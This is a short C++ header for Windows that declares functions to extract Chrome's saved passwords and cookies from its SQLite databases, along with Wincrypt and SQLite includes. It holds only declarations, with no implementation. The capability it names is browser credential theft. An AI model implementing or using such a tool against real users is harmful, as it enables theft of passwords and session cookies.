#ifndef WIN_TOOLS
#define WIN_TOOLS

#include <windows.h>
#include <Wincrypt.h>
#include <tchar.h>
#include <sstream>
#include <iostream>
#include "../sqlite3.h"

std::stringstream get_chrome_pass(sqlite3* db);
std::stringstream get_chrome_cookies(sqlite3* db);
int callback(void *NotUsed, int argc, char **argv, char **azColName);

#endif